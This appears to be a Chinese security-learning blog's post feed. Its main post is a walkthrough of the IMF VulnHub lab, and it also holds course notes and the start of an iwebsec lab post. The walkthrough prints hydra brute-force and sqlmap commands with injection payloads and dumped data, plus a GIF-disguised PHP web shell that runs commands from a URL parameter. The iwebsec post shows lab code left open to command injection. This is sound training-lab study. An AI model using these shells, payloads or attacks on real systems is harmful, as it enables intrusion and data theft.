- /.htm</span><br><span class="line">[19:09:57] 403 -  301B  - /.httr-oauth</span><br><span class="line">[19:09:57] 403 -  300B  - /.htpasswds</span><br><span class="line">[19:09:58] 403 -  294B  - /.php</span><br><span class="line">[19:09:58] 403 -  295B  - /.php3</span><br><span class="line">[19:10:17] 200 -    2KB - /contact.php</span><br><span class="line">[19:10:18] 301 -  316B  - /css  -&gt;  http://192.168.159.139/css/</span><br><span class="line">[19:10:23] 301 -  318B  - /fonts  -&gt;  http://192.168.159.139/fonts/</span><br><span class="line">[19:10:26] 301 -  319B  - /images  -&gt;  http://192.168.159.139/images/</span><br><span class="line">[19:10:26] 403 -  297B  - /images/</span><br><span class="line">[19:10:28] 403 -  293B  - /js/</span><br><span class="line">[19:10:42] 200 -    2KB - /projects.php</span><br><span class="line">[19:10:45] 403 -  304B  - /server-status/</span><br><span class="line">[19:10:45] 403 -  303B  - /server-status</span><br></pre></td></tr></table></figure></p><p>在里面的contact.php里面发现了第一个flag<br><img src="https://pic.imgdb.cn/item/66bde374d9c307b7e974cb1c.png" alt=""></p><p>flag里面一眼base64</p><p><img src="https://pic.imgdb.cn/item/66bde3fcd9c307b7e975d11b.png" alt=""></p><p>没看懂,althefile啥意思</p><p>但是看着里面的js文件有一个是base64加密的</p><p><img src="https://pic.imgdb.cn/item/66bde484d9c307b7e976ccb1.png" alt=""></p><p>解码后是这个<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yYXRvcg==&#125;</span><br></pre></td></tr></table></figure></p><p>🤔，看着像是一部分</p><p>那我就讲上面两个也加进来</p><p>果然</p><p>falg2也出来了</p><p><img src="https://pic.imgdb.cn/item/66bde692d9c307b7e97a19a0.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aW1mYWRtaW5pc3RyYXRvcg==</span><br></pre></td></tr></table></figure><p>在进行一次base</p><p><img src="https://pic.imgdb.cn/item/66bde6d6d9c307b7e97a529c.png" alt=""></p><p>imfadministrator，看着应该是一个目录，进去以后发现是一个登录框，只有username和password</p><p>试了试跑sqlmap，用htdra跑，都没成，猜测过是不是contact.php下面的三个用户(那下面有三个人名)</p><p>但是都没成</p><p>尝试用PHP利用数组‘[ ]’绕过，试一试后台是否使用了不安全的函数进行对密码的验证</p><p>php中可以使用数组’[ ]‘绕过的函数有：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sha1</span><br><span class="line">MD5</span><br><span class="line">ereg</span><br><span class="line">strpos</span><br><span class="line">Strcmp</span><br></pre></td></tr></table></figure></p><p>尝试爆破的时候rmichaels存在<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l rmichaels -P /usr/share/wordlists/rockyou.txt 192.168.159.139 http-post-form &quot;/imfadministrator/:user=^USER^&amp;pass=^PASS^:error&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="https://pic.imgdb.cn/item/66bde8b7d9c307b7e97bea28.png" alt=""></p><p>flag3</p><p>仨东西看半天啥都没有，尝试了一下sql注入，这次有了报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.159.139/imfadministrator/cms.php?pagename=home&#x27; --cookie &#x27;PHPSESSID=2n5274m8us95f0p8g59643oqt0&#x27; --dump</span><br></pre></td></tr></table></figure><p>回显<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sqlmap -u &#x27;http://192.168.159.139/imfadministrator/cms.php?pagename=home&#x27; --cookie &#x27;PHPSESSID=2n5274m8us95f0p8g59643oqt0&#x27; --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.7#stable&#125;</span><br><span class="line">|_ -| . [.]     | .&#x27;| . |</span><br><span class="line">|___|_  [&quot;]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 19:49:03 /2024-08-15/</span><br><span class="line"></span><br><span class="line">[19:49:03] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[19:49:03] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: pagename (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: pagename=home&#x27; AND 7798=7798 AND &#x27;ySad&#x27;=&#x27;ySad</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: pagename=home&#x27; AND (SELECT 5733 FROM(SELECT COUNT(*),CONCAT(0x7176707871,(SELECT (ELT(5733=5733,1))),0x7162627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;CdrD&#x27;=&#x27;CdrD</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: pagename=home&#x27; AND (SELECT 3343 FROM (SELECT(SLEEP(5)))Sctp) AND &#x27;CJIN&#x27;=&#x27;CJIN</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - 1 column</span><br><span class="line">    Payload: pagename=-3960&#x27; UNION ALL SELECT CONCAT(0x7176707871,0x5266474a59766f466a63444e4758726f447a677748476d7146444d5850487153644e756173757052,0x7162627671)#</span><br><span class="line">---</span><br><span class="line">[19:49:03] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)</span><br><span class="line">web application technology: Apache 2.4.18</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">[19:49:03] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries</span><br><span class="line">[19:49:03] [INFO] fetching current database</span><br><span class="line">[19:49:03] [INFO] fetching tables for database: &#x27;admin&#x27;</span><br><span class="line">[19:49:03] [INFO] fetching columns for table &#x27;pages&#x27; in database &#x27;admin&#x27;</span><br><span class="line">[19:49:03] [INFO] retrieved: &#x27;id&#x27;,&#x27;int(11)&#x27;</span><br><span class="line">[19:49:03] [INFO] retrieved: &#x27;pagename&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[19:49:03] [INFO] retrieved: &#x27;pagedata&#x27;,&#x27;text&#x27;</span><br><span class="line">[19:49:03] [INFO] fetching entries for table &#x27;pages&#x27; in database &#x27;admin&#x27;                     </span><br><span class="line">[19:49:03] [INFO] retrieved: &#x27;1&#x27;,&#x27;Under Construction.&#x27;,&#x27;upload&#x27;</span><br><span class="line">[19:49:03] [INFO] retrieved: &#x27;2&#x27;,&#x27;Welcome to the IMF Administration.&#x27;,&#x27;home&#x27;</span><br><span class="line">[19:49:03] [INFO] retrieved: &#x27;3&#x27;,&#x27;Training classrooms available. &lt;br /&gt;&lt;img src=&quot;./images/w...</span><br><span class="line">[19:49:03] [INFO] retrieved: &#x27;4&#x27;,&#x27;&lt;h1&gt;Disavowed List&lt;/h1&gt;&lt;img src=&quot;./images/redacted.jpg&quot;&gt;&lt;...</span><br><span class="line">Database: admin                                                                              </span><br><span class="line">Table: pages</span><br><span class="line">[4 entries]</span><br><span class="line">+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+</span><br><span class="line">| id | pagedata                                                                                                                                                              | pagename             |</span><br><span class="line">+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+</span><br><span class="line">| 1  | Under Construction.                                                                                                                                                   | upload               |</span><br><span class="line">| 2  | Welcome to the IMF Administration.                                                                                                                                    | home                 |</span><br><span class="line">| 3  | Training classrooms available. &lt;br /&gt;&lt;img src=&quot;./images/whiteboard.jpg&quot;&gt;&lt;br /&gt; Contact us for training.                                                               | tutorials-incomplete |</span><br><span class="line">| 4  | &lt;h1&gt;Disavowed List&lt;/h1&gt;&lt;img src=&quot;./images/redacted.jpg&quot;&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;*********&lt;/li&gt;&lt;li&gt;****** ******&lt;/li&gt;&lt;li&gt;*******&lt;/li&gt;&lt;li&gt;**** ********&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;-Secretary | disavowlist          |</span><br><span class="line">+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+</span><br><span class="line"></span><br><span class="line">[19:49:03] [INFO] table &#x27;`admin`.pages&#x27; dumped to CSV file &#x27;/home/kali/.local/share/sqlmap/output/192.168.159.139/dump/admin/pages.csv&#x27;</span><br><span class="line">[19:49:03] [INFO] fetched data logged to text files under &#x27;/home/kali/.local/share/sqlmap/output/192.168.159.139&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 19:49:03 /2024-08-15/</span><br></pre></td></tr></table></figure></p><p>访问之前没访问过的两个图片，其中的白板后面有一个二维码</p><p><img src="https://pic.imgdb.cn/item/66bdec0dd9c307b7e97ec1b0.png" alt=""></p><p>flag4 get</p><p>老规矩，在base</p><p><img src="https://pic.imgdb.cn/item/66bdec4ad9c307b7e97ef530.png" alt=""></p><p>（跟剥粽子一样，一层一层的</p><p><img src="https://pic.imgdb.cn/item/66bdec8cd9c307b7e97f2c10.png" alt=""></p><p>挺明显的传🐎</p><p>Linux里面有一个菜刀的下位weevely，试一试奥</p><p><img src="https://pic.imgdb.cn/item/66bded1cd9c307b7e97fa044.png" alt=""></p><p>坦白讲已经在质疑了，前面加上gif的头部</p><p><img src="https://pic.imgdb.cn/item/66bded68d9c307b7e97fe0b8.png" alt=""></p><p>果然，惨遭拒绝,sad</p><p>好吧，我的问题，忘了吧c.php改成c.gif，这次上传成了</p><p>在源码中看到上传到服务器中的名字e4608a7887a0</p><p><img src="https://pic.imgdb.cn/item/66bdee45d9c307b7e980f027.png" alt=""></p><p>weevely连接<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ weevely http://192.168.159.139/imfadministrator/uploads/e4608a7887a0.gif test</span><br><span class="line"></span><br><span class="line">[+] weevely 4.0.1</span><br><span class="line"></span><br><span class="line">[+] Target:     192.168.159.139</span><br><span class="line">[+] Session:    /home/kali/.weevely/sessions/192.168.159.139/e4608a7887a0_0.session</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :help for more information.</span><br><span class="line"></span><br><span class="line">weevely&gt; id</span><br></pre></td></tr></table></figure></p><p>这里报错后面连接错误，奇了怪了我留的是test的</p><p>这个不行我再试试别的，因为测试过只能穿图片类文件，那我就文件包裹被</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b 文件1+文件2 文件3</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66bdf16cd9c307b7e9867c85.png" alt=""></p><p>还是不行，最后还是自己写的🐎，惆怅</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">&lt;?php echo `id`); ?&gt;</span><br><span class="line">试探一下</span><br><span class="line">GIF89a      </span><br><span class="line">&lt;?php $dayu=$_GET[&#x27;dayu&#x27;]; print(`$dayu`); ?&gt;</span><br></pre></td></tr></table></figure><p>这次成了</p><p>为啥不用蚁剑呢，这次又waf，就这么简单</p><p><img src="https://pic.imgdb.cn/item/66bdf551d9c307b7e98dca69.png" alt=""></p><p>这次终究是出来flag5了，点烟.jpg</p><p>后面wp说有一个缓冲区溢出，太晚了不想学了，tomorrow再说</p><p>补坑</p><p>奇了怪了，我用weevely又尝试了一边，也上传成功了，但是连接的时候说后门交流有问题，</p><p>自己写的🐎在上传的时候wget也出问题了，奇了怪了真的是</p><p><img src="https://pic.imgdb.cn/item/66bec2abd9c307b7e92f9694.png" alt=""></p><p>拿不到shell后面进行不下去，真是见了鬼了</p><p>解决了，有点绷不住了，kali.2024.1在不换源不更新的情况下能用weevely，但是一换源已更新或者下载的2024.2就不行了，一时间有点子难崩</p><p><img src="https://pic.imgdb.cn/item/66c058cad9c307b7e9f6e392.png" alt=""></p><p>这次终于是成功了</p><p>真的无语，我及时更新我还有错了属于是</p><p>这样的话也能抓到flag5了</p><p><img src="https://pic.imgdb.cn/item/66c0593dd9c307b7e9f7960c.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/66c05978d9c307b7e9f80cd8.png" alt=""></p><p>继续剥洋葱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name agent &amp;&gt;1/dev/unll</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&amp;&gt;1/dev/unll:将错误输出到/dev/unll,只显示正确结果</p><p>找到这两个文件夹下面有agent文件</p><p>进入到bin里面看到两个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@imf:/var/www/html/imfadministrator/uploads $ cd /usr/local/bin/</span><br><span class="line">www-data@imf:/usr/local/bin $ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  2 root root  4096 Oct 16  2016 .</span><br><span class="line">drwxr-xr-x 10 root root  4096 Sep 22  2016 ..</span><br><span class="line">-rw-r--r--  1 root root    19 Oct 16  2016 access_codes</span><br><span class="line">-rwxr-xr-x  1 root root 11896 Oct 12  2016 agent</span><br><span class="line">www-data@imf:/usr/local/bin $ file agent</span><br><span class="line">agent: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=444d1910b8b99d492e6e79fe2383fd346fc8d4c7, not stripped</span><br><span class="line">www-data@imf:/usr/local/bin $ file access_codes</span><br><span class="line">access_codes: ASCII text</span><br><span class="line">www-data@imf:/usr/local/bin $ cat access_code</span><br><span class="line">cat: access_code: No such file or directory</span><br><span class="line">www-data@imf:/usr/local/bin $ cat access_codes</span><br><span class="line">SYN 7482,8279,9467</span><br><span class="line">www-data@imf:/usr/local/bin $ </span><br></pre></td></tr></table></figure><p>提示了syn 7482 8279 9467</p><p>应该是端口号，nmap 扫一下</p><p>没扫出来，看了下wp应该先knock进行端口实验一下</p><p>很烦，这个kali一直下不了knockd，报错<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树... 完成</span><br><span class="line">正在读取状态信息... 完成                 </span><br><span class="line">E: 无法定位软件包 knockd</span><br></pre></td></tr></table></figure></p><p>给我整的有点无语</p><p><img src="https://pic.imgdb.cn/item/66c05d34d9c307b7e9fef7be.png" alt=""></p><p>我用另一台弄的，knock了半天，nmap扫了半天,7788还是没开放</p><p>真是服了，折腾来折腾去的，不想打这个了，弃坑了</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> imf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>今日无事，勾栏听曲</title>
      <link href="/2025/01/08/2024%E5%B9%B47%E6%9C%883%E6%97%A5-%E5%8B%BE%E6%A0%8F%E5%90%AC%E6%9B%B2/"/>
      <url>/2025/01/08/2024%E5%B9%B47%E6%9C%883%E6%97%A5-%E5%8B%BE%E6%A0%8F%E5%90%AC%E6%9B%B2/</url>
      
        <content type="html"><![CDATA[<p>今日无事，勾栏听曲</p><p><del>其实是在做小学期数据库课设，已经要死掉了</del></p>]]></content>
      
      
      <categories>
          
          <category> 咕咕咕 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 史诗级鸽子精 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪笔记day3--抓包&amp;封包&amp;协议&amp;app&amp;小程序</title>
      <link href="/2025/01/08/2024%E5%B9%B47%E6%9C%8831%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day3/"/>
      <url>/2025/01/08/2024%E5%B9%B47%E6%9C%8831%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day3/</url>
      
        <content type="html"><![CDATA[<h1 id="抓包封包工具"><a href="#抓包封包工具" class="headerlink" title="抓包封包工具"></a>抓包封包工具</h1><p>burpsuite</p><p>charles</p><p>fiddler</p><p>个人感觉常用的就bp和青花瓷就可以了，八爪鱼没用过…不做评价</p><p>记得吧证书安装到浏览器和模拟器中，不然浏览器抓不到包，模拟器会一直报证书有问题</p><p>（好像是因为你个人装的话装进个人里面，需要装到系统的那里面才可以）</p><p>app抓包的目的就是把app中的信息提取出来，获得他的api获得他的信息等等来进行web攻防</p><p>非web协议，上述三个就没用了</p><p>可以用wireshark和科莱网络分析系统</p><p>抓包是零散的，封包就是你的每一个操作的</p><p>wpe和cc是一套的，wpe抓cc的包，封包监控是一体的</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪笔记day2--web应用&amp;架构搭建&amp;漏洞&amp;http数据报&amp;代理服务器</title>
      <link href="/2025/01/08/2024%E5%B9%B47%E6%9C%8830%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day2/"/>
      <url>/2025/01/08/2024%E5%B9%B47%E6%9C%8830%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day2/</url>
      
        <content type="html"><![CDATA[<h1 id="网站搭建前置"><a href="#网站搭建前置" class="headerlink" title="网站搭建前置"></a>网站搭建前置</h1><p>域名，子域名，DNS，HTTP/HTTPS，SSL证书</p><p>域名：网站的名字，例如www.baidu.com</p><p>DNS：解析域名的</p><h1 id="web应用架构"><a href="#web应用架构" class="headerlink" title="web应用架构"></a>web应用架构</h1><p>开发语言:asp,php,aspx,jsp,java,python,ruby,go,html,js</p><p>程序源码：开源cms分类，开发语言分类，应用类型分类，开发框架分类</p><p>中间件容器：IIS,APACHE,NGINX,TOMENT,WEBLOGIC,JBOOS,GLASSHFISH</p><p>第三方软件：phpmyadmin,vs-ftpd,vnc,openssh</p><p>数据库类型：access,mysql,mssql,oracle,db2,sybase,redis,mongdb</p><h1 id="web安全漏洞"><a href="#web安全漏洞" class="headerlink" title="web安全漏洞"></a>web安全漏洞</h1><p>sql注入，xxe/xml，弱口令，文件安全，rce，csrf/ssrf/crlf，反序列化，逻辑越权，未授权访问等等</p><h1 id="web请求返回过程数据包"><a href="#web请求返回过程数据包" class="headerlink" title="web请求返回过程数据包"></a>web请求返回过程数据包</h1><p><a href="https://www.jianshu.com/p/558455228c43">https://www.jianshu.com/p/558455228c43</a></p><p><a href="https://www.cnblogs.com/cherrycui/p/10815465.html">https://www.cnblogs.com/cherrycui/p/10815465.html</a></p><p><a href="https://www.runoob.com/http/http-status-codes.html">http状态码</a></p><p>可以用bp简单客串一下扫描器，具体就是用爆破的方法，如果404就没有，403就存在</p><p>如果被拉黑了你的ip,上代理池/ww或者你去换一个</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪笔记day1--名词解释&amp;文件下载&amp;反弹shell&amp;文件上传下载&amp;防火墙绕过</title>
      <link href="/2025/01/08/2024%E5%B9%B47%E6%9C%8830%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day1/"/>
      <url>/2025/01/08/2024%E5%B9%B47%E6%9C%8830%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day1/</url>
      
        <content type="html"><![CDATA[<h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><p>poc：概念验证，常指的是一段漏洞证明的代码</p><p>（就是根据漏洞的一些信息，比如nuclei使用的yaml中，根据baseurl以及一些的raw http进行访问，再通过dsl,words，等进一步确认漏洞存在）</p><p>exp:漏洞利用脚本，不解释</p><p>paylaod：exp成功执行的时候，真正在目标系统执行的代码或指令</p><p>shellcode：指的是漏洞载荷，免杀经常提到</p><p>后门：通称，web网站叫webshell，但是其实还有系统等</p><p>木马：针对电脑的控制</p><p>病毒：破坏性的程序</p><p>反弹：弹shell，将权限转移到其他地方</p><p>跳板：中间的机器，A无法连接B，A可以通过连接B来达到连接C的</p><p><a href="https://www.cnblogs.com/sunny11/p/13583083.html">参考</a></p><h1 id="文件上传下载"><a href="#文件上传下载" class="headerlink" title="文件上传下载"></a>文件上传下载</h1><p>linux：wget curl ruby perl java python等</p><p>windows:powershell certutil bitsadmin msiexec mshta rund1132等</p><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">命令</a></p><p><a href="https://forum.ywhack.com/infosec.php">study 棱角社区</a></p><p>需要注意的是下载的文件夹的权限</p><h1 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h1><p>root or user</p><p>提权</p><p>前面靶机基本上最后都是提权完成的，我记得以前看了个文章说有100多个提权手法？（忘记了）</p><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>windows默认自带windows defender</p><p>linux默认是iptables</p><p>入站出站协议</p><p>传webshell需要交互式 的，（联想到python的哪个命令）</p><p>内外网区分<br><img src="https://pic.imgdb.cn/item/66a8e27ed9c307b7e93458ad.png" alt=""></p><p>所以说靶机尽量不要搞在线靶机</p><p>比如你上fofa搜能找到同行的pikachu，，，还是一堆…</p><p>难崩<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;</span><br></pre></td></tr></table></figure></p><p>别干坏事奥</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iwebsec---- not only rce/sqli</title>
      <link href="/2025/01/08/2024%E5%B9%B47%E6%9C%8827%E6%97%A5-iwebsec%E9%9D%B6%E5%9C%BA/"/>
      <url>/2025/01/08/2024%E5%B9%B47%E6%9C%8827%E6%97%A5-iwebsec%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>iwebsec是一个相对比较全的靶场，上面啥类型的都有，感觉有点像pikachu的进阶版（刚配置好还没打）</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>下载地址直接去官网就好<a href="http://www.iwebsec.com">iwebsec</a></p><p>懒人，直接下的iwebsec的虚拟机（密码就是iwebsec，账号也是），打开直接查看ip地址，在浏览器打开时这个样子<br><a href="https://imgse.com/i/pkqQPDx"><img src="https://s21.ax1x.com/2024/07/27/pkqQPDx.png" alt="pkqQPDx.png"></a></p><h1 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h1><h2 id="01"><a href="#01" class="headerlink" title="01"></a>01</h2><p><a href="https://imgse.com/i/pkqQAUO"><img src="https://s21.ax1x.com/2024/07/27/pkqQAUO.png" alt="pkqQAUO.png"></a></p><p>在ubuntu里面打开docker ps查看容器<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iwebsec@ubuntu:~$ docker ps</span><br><span class="line">CONTAINER ID   IMAGE             COMMAND       CREATED       STATUS                  PORTS                                                           NAMES</span><br><span class="line">bc23a49cb37c   iwebsec/iwebsec   &quot;/start.sh&quot;   3 years ago   Up Less than a second   0.0.0.0:80-&gt;80/tcp, 0.0.0.0:6379-&gt;6379/tcp, 0.0.0.0:7001-&gt;7001/tcp, 0.0.0.0:8000-&gt;8000/tcp, 0.0.0.0:8080-&gt;8080/tcp, 22/tcp, 0.0.0.0:8088-&gt;8088/tcp, 0.0.0.0:13307-&gt;3306/tcp   beautiful_diffie</span><br></pre></td></tr></table></figure><br>通过docker exec进入到docker容器的命令行界面<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it bc23a49cb37c bash </span><br></pre></td></tr></table></figure><br>因为第一关的url是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.137/exec/01.php</span><br></pre></td></tr></table></figure></p><p>所以直接找/var/www/html/exec/01.php查看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c /]# cat /var/www/html/exec/01.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  require_once(&#x27;../header.php&#x27;);</span><br><span class="line">  ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;命令执行漏洞&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;命令执行漏洞&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/01.php?ip=127.0.0.1 &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">    system(&quot;ping -c 2 &quot;.$ip);</span><br><span 